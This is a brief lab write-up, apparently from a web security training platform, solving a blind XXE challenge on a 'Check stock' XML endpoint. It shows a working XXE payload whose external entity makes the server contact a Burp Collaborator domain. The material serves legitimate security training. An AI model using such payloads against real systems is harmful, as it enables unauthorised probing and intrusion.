## Blind XXE with out-of-band interaction

This lab has a "Check stock" feature that parses XML input but does not display the result.

You can detect the blind XXE vulnerability by triggering out-of-band interactions with an external domain.

To solve the lab, use an external entity to make the XML parser issue a DNS lookup and HTTP request to Burp Collaborator.

## Notes

- /product/stock
- /resources/js/stockCheck.js
- /resources/js/xmlStockCheckPayload.js

## Resume

1. Capture a `/product/stock`
2. Update the XML to try some OOB XXE payload using collborator 



## Solve 

Capture a `/product/stock` request : 

```xml
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```

Update the XML to try to hit burp collaborator

```xml
<?xml version="1.0" encoding="UTF-8"?>

<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://vponetcbbbgq3o7trq8bi8ci49a0yqmf.oastify.com"> ]>

<stockCheck><productId>3&xxe;</productId><storeId>1</storeId></stockCheck>
```
